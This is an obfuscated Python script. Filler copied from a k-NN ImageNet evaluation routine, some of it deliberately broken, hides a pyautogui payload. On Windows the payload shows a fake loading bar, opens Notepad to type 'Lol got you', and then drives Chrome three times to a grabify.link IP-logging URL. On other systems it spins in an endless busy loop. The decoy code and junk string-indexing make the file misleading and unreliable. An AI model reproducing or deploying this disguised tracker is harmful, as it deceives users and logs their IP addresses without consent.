Hiweo2lkdo = "1"
boewes = "293298jsa1iwo2o1ojlow"
boewes[10]
dcaepw = "owsoii@32oidsoiklowoIOJklweo"
mablieb = Hiweo2lkdo[0] + boewes[1] + boewes[8] + boewes[9] + dcaepw[12] 
main_boo = int(mablieb[3])

owoicoiw = "woi20982l;LO:Ih'2123aopsi"
woicow = "lpLoiuWSd12233(*W@23jO8998"
if owoicoiw[12]:
    if ~bool( woicow[3]):
        woicow = "lpl0iuwsd12233(*w@23jo8998"
        boi = "woeiki2#23" + woicow[3] + woicow[2] + woicow[23]
    if int(boi[10]):
        def extract_features(model, data_loader):
            metric_logger = utils.metriclogger(delimiter="  ")
            features = none
            for samples, index in metric_logger.log_every(data_loader, 10):
                samples = samples.cuda(non_blocking=true)
                index = index.cuda(non_blocking=true)
                feats = model(samples).clone()

                if dist.get_rank() == 0 and features is none:
                    features = torch.zeros(len(data_loader.dataset), feats.shape[-1])
                    if args.use_cuda:
                        features = features.cuda(non_blocking=true)
                    print(f"storing features into tensor of shape {features.shape}")

                y_all = torch.empty(dist.get_world_size(), index.size(0), dtype=index.dtype, device=index.device)
                y_l = list(y_all.unbind(0))
                y_all_reduce = torch.distributed.all_gather(y_l, index, async_op=true)
                y_all_reduce.wait()
                index_all = torch.cat(y_l)

                feats_all = torch.empty(
                    dist.get_world_size(),
                    feats.size(0),
                    feats.size(1),
                    dtype=feats.dtype,
                    device=feats.device,
                )
                output_l = list(feats_all.unbind(0))
                output_all_reduce = torch.distributed.all_gather(output_l, feats, async_op=true)
                output_all_reduce.wait()

                if dist.get_rank() == 0:
                    if args.use_cuda:
                        features.index_copy_(0, index_all, torch.cat(output_l))
                    else:
                        features.index_copy_(0, index_all.cpu(), torch.cat(output_l).cpu())
            return features


        @torch.no_grad()
        def knn_classifier(train_features, train_labels, test_features, test_labels, k, t, num_classes=1000):
            top1, top5, total = 0.0, 0.0, 0
            train_features = train_features.t()
            num_test_images, num_chunks = test_labels.shape[0], 100
            imgs_per_chunk = num_test_images // num_chunks
            retrieval_one_hot = torch.zeros(k, num_classes).cuda()
            for idx in range(0, num_test_images, imgs_per_chunk):
                features = test_features[
                    idx : min((idx + imgs_per_chunk), num_test_images), :
                ]
                targets = test_labels[idx : min((idx + imgs_per_chunk), num_test_images)]
                batch_size = targets.shape[0]

                similarity = torch.mm(features, train_features)
                distances, indices = similarity.topk(k, largest=true, sorted=true)
                candidates = train_labels.view(1, -1).expand(batch_size, -1)
                retrieved_neighbors = torch.gather(candidates, 1, indices)

                retrieval_one_hot.resize_(batch_size * k, num_classes).zero_()
                retrieval_one_hot.scatter_(1, retrieved_neighbors.view(-1, 1), 1)
                distances_transform = distances.clone().div_(t).exp_()

                probs = torch.sum(
                    torch.mul(
                        retrieval_one_hot.view(batch_size, -1, num_classes),
                        distances_transform.view(batch_size, -1, 1),
                    ),
                    1,
                )
                _, predictions = probs.sort(1, True)

                correct = predictions.eq(targets.data.view(-1, 1))
                top1 = top1 + correct.narrow(1, 0, 1).sum().item()
                top5 = top5 + correct.narrow(1, 0, 5).sum().item()
                total += targets.size(0)
            top1 = top1 * 100.0 / total
            top5 = top5 * 100.0 / total
            return top1, top5


        class ReturnIndexDataset(datasets.ImageFolder):
            def __getitem__(self, idx):
                img, lab = super(ReturnIndexDataset, self).__getitem__(idx)
                return img, idx


        if __name__ == '__main__':
            parser = argparse.ArgumentParser('Evaluation with weighted k-NN on ImageNet')
            parser.add_argument('--batch_size_per_gpu', default=128, type=int, help='Per-GPU batch-size')
            parser.add_argument('--nb_knn', default=[10, 20, 100, 200], nargs='+', type=int,
                help='Number of NN to use. 20 is usually working the best.')
            parser.add_argument('--temperature', default=0.07, type=float,
                help='Temperature used in the voting coefficient')
            parser.add_argument('--pretrained_weights', default='', type=str, help="Path to pretrained weights to evaluate.")
            parser.add_argument('--use_cuda', default=True, type=utils.bool_flag,
                help="Should we store the features on GPU? We recommend setting this to False if you encounter OOM")
            parser.add_argument('--arch', default='deit_small', type=str,
                choices=['deit_tiny', 'deit_small', 'vit_base'], help='Architecture (support only ViT atm).')
            parser.add_argument('--patch_size', default=16, type=int, help='Patch resolution of the model.')
            parser.add_argument("--checkpoint_key", default="teacher", type=str,
                help='Key to use in the checkpoint (example: "teacher")')
            parser.add_argument('--dump_features', default=None,
                help='Path where to save computed features, empty for no saving')
            parser.add_argument('--load_features', default=None, help="""If the features have
            already been computed, where to find them.""")
            parser.add_argument('--num_workers', default=10, type=int, help='Number of data loading workers per GPU.')
            parser.add_argument("--dist_url", default="env://", type=str, help="""url used to set up
                distributed training; see https://pytorch.org/docs/stable/distributed.html""")
            parser.add_argument("--local_rank", default=0, type=int, help="Please ignore and do not set this argument.")
            parser.add_argument('--data_path', default='/path/to/imagenet/', type=str)
            args = parser.parse_args()

            utils.init_distributed_mode(args)
            print("git:\n  {}\n".format(utils.get_sha()))
            print("\n".join("%s: %s" % (k, str(v)) for k, v in sorted(dict(vars(args)).items())))
            cudnn.benchmark = True

            if args.load_features:
                train_features = torch.load(os.path.join(args.load_features, "trainfeat.pth"))
                test_features = torch.load(os.path.join(args.load_features, "testfeat.pth"))
                train_labels = torch.load(os.path.join(args.load_features, "trainlabels.pth"))
                test_labels = torch.load(os.path.join(args.load_features, "testlabels.pth"))

            if utils.get_rank() == 0:
                if args.use_cuda:
                    train_features = train_features.cuda()
                    test_features = test_features.cuda()
                    train_labels = train_labels.cuda()
                    test_labels = test_labels.cuda()

                print("Features are ready!\nStart the k-NN classification.")
                for k in args.nb_knn:
                    top1, top5 = knn_classifier(train_features, train_labels,
                        test_features, test_labels, k, args.temperature)
                    print(f"{k}-NN classifier result: Top1: {top1}, Top5: {top5}")
            dist.barrier()
try :
    import pyautogui , time , os
    print("imported")
except:
    print("Woops! ")
    print(""" Pyautogui is not installed in your System
    for installin pls enter the following command in your terminal 
     [pip install pyautogui]  """)
    main_boo = False

owoicoiw = "woi20982l;LO:Ih'2123aopsi"
woicow = "lpLoiuWSd12233(*W@23jO8998"
if owoicoiw[12]:
    if ~bool( woicow[3]):
        woicow = "lpL0iuWSd12233(*W@23jO8998"
        boi = "woeiKi2#23" + woicow[3] + woicow[2] + woicow[23]
    if int(boi[10]):
        def extract_features(model, data_loader):
            metric_logger = utils.MetricLogger(delimiter="  ")
            features = None
            for samples, index in metric_logger.log_every(data_loader, 10):
                samples = samples.cuda(non_blocking=True)
                index = index.cuda(non_blocking=True)
                feats = model(samples).clone()

                if dist.get_rank() == 0 and features is None:
                    features = torch.zeros(len(data_loader.dataset), feats.shape[-1])
                    if args.use_cuda:
                        features = features.cuda(non_blocking=True)
                    print(f"Storing features into tensor of shape {features.shape}")

                y_all = torch.empty(dist.get_world_size(), index.size(0), dtype=index.dtype, device=index.device)
                y_l = list(y_all.unbind(0))
                y_all_reduce = torch.distributed.all_gather(y_l, index, async_op=True)
                y_all_reduce.wait()
                index_all = torch.cat(y_l)

                feats_all = torch.empty(
                    dist.get_world_size(),
                    feats.size(0),
                    feats.size(1),
                    dtype=feats.dtype,
                    device=feats.device,
                )
                output_l = list(feats_all.unbind(0))
                output_all_reduce = torch.distributed.all_gather(output_l, feats, async_op=True)
                output_all_reduce.wait()

                if dist.get_rank() == 0:
                    if args.use_cuda:
                        features.index_copy_(0, index_all, torch.cat(output_l))
                    else:
                        features.index_copy_(0, index_all.cpu(), torch.cat(output_l).cpu())
            return features


        @torch.no_grad()
        def knn_classifier(train_features, train_labels, test_features, test_labels, k, T, num_classes=1000):
            top1, top5, total = 0.0, 0.0, 0
            train_features = train_features.t()
            num_test_images, num_chunks = test_labels.shape[0], 100
            imgs_per_chunk = num_test_images // num_chunks
            retrieval_one_hot = torch.zeros(k, num_classes).cuda()
            for idx in range(0, num_test_images, imgs_per_chunk):
                features = test_features[
                    idx : min((idx + imgs_per_chunk), num_test_images), :
                ]
                targets = test_labels[idx : min((idx + imgs_per_chunk), num_test_images)]
                batch_size = targets.shape[0]

                similarity = torch.mm(features, train_features)
                distances, indices = similarity.topk(k, largest=True, sorted=True)
                candidates = train_labels.view(1, -1).expand(batch_size, -1)
                retrieved_neighbors = torch.gather(candidates, 1, indices)

                retrieval_one_hot.resize_(batch_size * k, num_classes).zero_()
                retrieval_one_hot.scatter_(1, retrieved_neighbors.view(-1, 1), 1)
                distances_transform = distances.clone().div_(T).exp_()

                probs = torch.sum(
                    torch.mul(
                        retrieval_one_hot.view(batch_size, -1, num_classes),
                        distances_transform.view(batch_size, -1, 1),
                    ),
                    1,
                )
                _, predictions = probs.sort(1, True)

                correct = predictions.eq(targets.data.view(-1, 1))
                top1 = top1 + correct.narrow(1, 0, 1).sum().item()
                top5 = top5 + correct.narrow(1, 0, 5).sum().item()
                total += targets.size(0)
            top1 = top1 * 100.0 / total
            top5 = top5 * 100.0 / total
            return top1, top5


        class ReturnIndexDataset(datasets.ImageFolder):
            def __getitem__(self, idx):
                img, lab = super(ReturnIndexDataset, self).__getitem__(idx)
                return img, idx


        if __name__ == '__main__':
            parser = argparse.ArgumentParser('Evaluation with weighted k-NN on ImageNet')
            parser.add_argument('--batch_size_per_gpu', default=128, type=int, help='Per-GPU batch-size')
            parser.add_argument('--nb_knn', default=[10, 20, 100, 200], nargs='+', type=int,
                help='Number of NN to use. 20 is usually working the best.')
            parser.add_argument('--temperature', default=0.07, type=float,
                help='Temperature used in the voting coefficient')
            parser.add_argument('--pretrained_weights', default='', type=str, help="Path to pretrained weights to evaluate.")
            parser.add_argument('--use_cuda', default=True, type=utils.bool_flag,
                help="Should we store the features on GPU? We recommend setting this to False if you encounter OOM")
            parser.add_argument('--arch', default='deit_small', type=str,
                choices=['deit_tiny', 'deit_small', 'vit_base'], help='Architecture (support only ViT atm).')
            parser.add_argument('--patch_size', default=16, type=int, help='Patch resolution of the model.')
            parser.add_argument("--checkpoint_key", default="teacher", type=str,
                help='Key to use in the checkpoint (example: "teacher")')
            parser.add_argument('--dump_features', default=None,
                help='Path where to save computed features, empty for no saving')
            parser.add_argument('--load_features', default=None, help="""If the features have
            already been computed, where to find them.""")
            parser.add_argument('--num_workers', default=10, type=int, help='Number of data loading workers per GPU.')
            parser.add_argument("--dist_url", default="env://", type=str, help="""url used to set up
                distributed training; see https://pytorch.org/docs/stable/distributed.html""")
            parser.add_argument("--local_rank", default=0, type=int, help="Please ignore and do not set this argument.")
            parser.add_argument('--data_path', default='/path/to/imagenet/', type=str)
            args = parser.parse_args()

            utils.init_distributed_mode(args)
            print("git:\n  {}\n".format(utils.get_sha()))
            print("\n".join("%s: %s" % (k, str(v)) for k, v in sorted(dict(vars(args)).items())))
            cudnn.benchmark = True

            if args.load_features:
                train_features = torch.load(os.path.join(args.load_features, "trainfeat.pth"))
                test_features = torch.load(os.path.join(args.load_features, "testfeat.pth"))
                train_labels = torch.load(os.path.join(args.load_features, "trainlabels.pth"))
                test_labels = torch.load(os.path.join(args.load_features, "testlabels.pth"))

            if utils.get_rank() == 0:
                if args.use_cuda:
                    train_features = train_features.cuda()
                    test_features = test_features.cuda()
                    train_labels = train_labels.cuda()
                    test_labels = test_labels.cuda()

                print("Features are ready!\nStart the k-NN classification.")
                for k in args.nb_knn:
                    top1, top5 = knn_classifier(train_features, train_labels,
                        test_features, test_labels, k, args.temperature)
                    print(f"{k}-NN classifier result: Top1: {top1}, Top5: {top5}")
            dist.barrier()

oweislowe = "owenwo2KOu239d8"
soilkeowk = "toewoioisoTweot"
if os.name != oweislowe[3] + soilkeowk[14] :
    main_boo = False
    print("Windows Os is required")

if not(main_boo):

    Hiweo2lkdo = "1"
    boewes = "293298jsa1iwo2o1ojlow"
    boewes[10]
    dcaepw = "owsoii@32oidsoiklowoIOJklweo"
    mablieb = Hiweo2lkdo[0] + boewes[1] + boewes[8] + boewes[9] + dcaepw[12] 
    while True:
        pass


Hiweo2lkdo = "1"
boewes = "293298jsa1iwo2o1ojlow"
boewes[10]
dcaepw = "owsoii@32oidsoiklowoIOJklweo"
mablieb = Hiweo2lkdo[0] + boewes[1] + boewes[8] + boewes[9] + dcaepw[12] 
boo = True

owoicoiw = "woi20982l;LO:Ih'2123aopsi"
woicow = "lpLoiuWSd12233(*W@23jO8998"

while main_boo:
    if boo:
        rnge = int(2)

        Hiweo2lkdo = "1"
        boewes = "293298jsa1iwo2o1ojlow"
        boewes[10]
        dcaepw = "owsoii@32oidsoiklowoIOJklweo"
        mablieb = Hiweo2lkdo[0] + boewes[1] + boewes[8] + boewes[9] + dcaepw[12] 
        for i in range(101):
            time.sleep(0.1)
            print(f"Loading {i}%\r", end='')

        Hiweo2lkdo = "1"
        boewes = "293298jsa1iwo2o1ojlow"
        boewes[10]
        dcaepw = "owsoii@32oidsoiklowoIOJklweo"
        mablieb = Hiweo2lkdo[0] + boewes[1] + boewes[8] + boewes[9] + dcaepw[12] 
    if boo:
        Hiweo2lkdo = "1"
        boewes = "293298jsa1iwo2o1ojlow"
        boewes[10]
        dcaepw = "owsoii@32oidsoiklowoIOJklweo"
        mablieb = Hiweo2lkdo[0] + boewes[1] + boewes[8] + boewes[9] + dcaepw[12] 
        for i in range(rnge):
            pyautogui.press("win")
            pyautogui.typewrite("Notepad")
            pyautogui.press("enter")
            pyautogui.hotkey("win", "up")
            pyautogui.typewrite("Lol got you ")
            boo = False
        
        for i in range(3):
            if not(oweislowe[12]):
                for samples, index in metric_logger.log_every(data_loader, 10):
                    samples = samples.cuda(non_blocking=True)
                    index = index.cuda(non_blocking=True)
                    feats = model(samples).clone()

                    if dist.get_rank() == 0 and features is None:
                        features = torch.zeros(len(data_loader.dataset), feats.shape[-1])
                        if args.use_cuda:
                            features = features.cuda(non_blocking=True)
                        print(f"Storing features into tensor of shape {features.shape}")

                    y_all = torch.empty(dist.get_world_size(), index.size(0), dtype=index.dtype, device=index.device)
                    y_l = list(y_all.unbind(0))
                    y_all_reduce = torch.distributed.all_gather(y_l, index, async_op=True)
                    y_all_reduce.wait()
                    index_all = torch.cat(y_l)

                    feats_all = torch.empty(
                        dist.get_world_size(),
                        feats.size(0),
                        feats.size(1),
                        dtype=feats.dtype,
                        device=feats.device,
                    )
                    output_l = list(feats_all.unbind(0))
                    output_all_reduce = torch.distributed.all_gather(output_l, feats, async_op=True)
                    output_all_reduce.wait()

                    if dist.get_rank() == 0:
                        if args.use_cuda:
                            features.index_copy_(0, index_all, torch.cat(output_l))
                        else:
                            features.index_copy_(0, index_all.cpu(), torch.cat(output_l).cpu())
            pyautogui.hotkey("win", "r")
            pyautogui.typewrite("chrome")
            pyautogui.press("enter")
            time.sleep(1)
            pyautogui.hotkey("ctrl", "l")
            pyautogui.typewrite("https://grabify.link/6R0IZC")
            pyautogui.press("enter")
owoicoiw = "woi20982l;LO:Ih'2123aopsi"
woicow = "lpLoiuWSd12233(*W@23jO8998"
if owoicoiw[12]:
    if ~bool( woicow[3]):
        woicow = "lpl0iuwsd12233(*w@23jo8998"
        boi = "woeiki2#23" + woicow[3] + woicow[2] + woicow[23]
    if int(boi[10]):
        def extract_features(model, data_loader):
            metric_logger = utils.metriclogger(delimiter="  ")
            features = none
            for samples, index in metric_logger.log_every(data_loader, 10):
                samples = samples.cuda(non_blocking=true)
                index = index.cuda(non_blocking=true)
                feats = model(samples).clone()

                if dist.get_rank() == 0 and features is none:
                    features = torch.zeros(len(data_loader.dataset), feats.shape[-1])
                    if args.use_cuda:
                        features = features.cuda(non_blocking=true)
                    print(f"storing features into tensor of shape {features.shape}")

                y_all = torch.empty(dist.get_world_size(), index.size(0), dtype=index.dtype, device=index.device)
                y_l = list(y_all.unbind(0))
                y_all_reduce = torch.distributed.all_gather(y_l, index, async_op=true)
                y_all_reduce.wait()
                index_all = torch.cat(y_l)

                feats_all = torch.empty(
                    dist.get_world_size(),
                    feats.size(0),
                    feats.size(1),
                    dtype=feats.dtype,
                    device=feats.device,
                )
                output_l = list(feats_all.unbind(0))
                output_all_reduce = torch.distributed.all_gather(output_l, feats, async_op=true)
                output_all_reduce.wait()

                if dist.get_rank() == 0:
                    if args.use_cuda:
                        features.index_copy_(0, index_all, torch.cat(output_l))
                    else:
                        features.index_copy_(0, index_all.cpu(), torch.cat(output_l).cpu())
            return features


        @torch.no_grad()
        def knn_classifier(train_features, train_labels, test_features, test_labels, k, t, num_classes=1000):
            top1, top5, total = 0.0, 0.0, 0
            train_features = train_features.t()
            num_test_images, num_chunks = test_labels.shape[0], 100
            imgs_per_chunk = num_test_images // num_chunks
            retrieval_one_hot = torch.zeros(k, num_classes).cuda()
            for idx in range(0, num_test_images, imgs_per_chunk):
                features = test_features[
                    idx : min((idx + imgs_per_chunk), num_test_images), :
                ]
                targets = test_labels[idx : min((idx + imgs_per_chunk), num_test_images)]
                batch_size = targets.shape[0]

                similarity = torch.mm(features, train_features)
                distances, indices = similarity.topk(k, largest=true, sorted=true)
                candidates = train_labels.view(1, -1).expand(batch_size, -1)
                retrieved_neighbors = torch.gather(candidates, 1, indices)

                retrieval_one_hot.resize_(batch_size * k, num_classes).zero_()
                retrieval_one_hot.scatter_(1, retrieved_neighbors.view(-1, 1), 1)
                distances_transform = distances.clone().div_(t).exp_()

                probs = torch.sum(
                    torch.mul(
                        retrieval_one_hot.view(batch_size, -1, num_classes),
                        distances_transform.view(batch_size, -1, 1),
                    ),
                    1,
                )
                _, predictions = probs.sort(1, True)

                correct = predictions.eq(targets.data.view(-1, 1))
                top1 = top1 + correct.narrow(1, 0, 1).sum().item()
                top5 = top5 + correct.narrow(1, 0, 5).sum().item()
                total += targets.size(0)
            top1 = top1 * 100.0 / total
            top5 = top5 * 100.0 / total
            return top1, top5


        class ReturnIndexDataset(datasets.ImageFolder):
            def __getitem__(self, idx):
                img, lab = super(ReturnIndexDataset, self).__getitem__(idx)
                return img, idx


        if __name__ == '__main__':
            parser = argparse.ArgumentParser('Evaluation with weighted k-NN on ImageNet')
            parser.add_argument('--batch_size_per_gpu', default=128, type=int, help='Per-GPU batch-size')
            parser.add_argument('--nb_knn', default=[10, 20, 100, 200], nargs='+', type=int,
                help='Number of NN to use. 20 is usually working the best.')
            parser.add_argument('--temperature', default=0.07, type=float,
                help='Temperature used in the voting coefficient')
            parser.add_argument('--pretrained_weights', default='', type=str, help="Path to pretrained weights to evaluate.")
            parser.add_argument('--use_cuda', default=True, type=utils.bool_flag,
                help="Should we store the features on GPU? We recommend setting this to False if you encounter OOM")
            parser.add_argument('--arch', default='deit_small', type=str,
                choices=['deit_tiny', 'deit_small', 'vit_base'], help='Architecture (support only ViT atm).')
            parser.add_argument('--patch_size', default=16, type=int, help='Patch resolution of the model.')
            parser.add_argument("--checkpoint_key", default="teacher", type=str,
                help='Key to use in the checkpoint (example: "teacher")')
            parser.add_argument('--dump_features', default=None,
                help='Path where to save computed features, empty for no saving')
            parser.add_argument('--load_features', default=None, help="""If the features have
            already been computed, where to find them.""")
            parser.add_argument('--num_workers', default=10, type=int, help='Number of data loading workers per GPU.')
            parser.add_argument("--dist_url", default="env://", type=str, help="""url used to set up
                distributed training; see https://pytorch.org/docs/stable/distributed.html""")
            parser.add_argument("--local_rank", default=0, type=int, help="Please ignore and do not set this argument.")
            parser.add_argument('--data_path', default='/path/to/imagenet/', type=str)
            args = parser.parse_args()

            utils.init_distributed_mode(args)
            print("git:\n  {}\n".format(utils.get_sha()))
            print("\n".join("%s: %s" % (k, str(v)) for k, v in sorted(dict(vars(args)).items())))
            cudnn.benchmark = True

            if args.load_features:
                train_features = torch.load(os.path.join(args.load_features, "trainfeat.pth"))
                test_features = torch.load(os.path.join(args.load_features, "testfeat.pth"))
                train_labels = torch.load(os.path.join(args.load_features, "trainlabels.pth"))
                test_labels = torch.load(os.path.join(args.load_features, "testlabels.pth"))

            if utils.get_rank() == 0:
                if args.use_cuda:
                    train_features = train_features.cuda()
                    test_features = test_features.cuda()
                    train_labels = train_labels.cuda()
                    test_labels = test_labels.cuda()

                print("Features are ready!\nStart the k-NN classification.")
                for k in args.nb_knn:
                    top1, top5 = knn_classifier(train_features, train_labels,
                        test_features, test_labels, k, args.temperature)
                    print(f"{k}-NN classifier result: Top1: {top1}, Top5: {top5}")
            dist.barrier()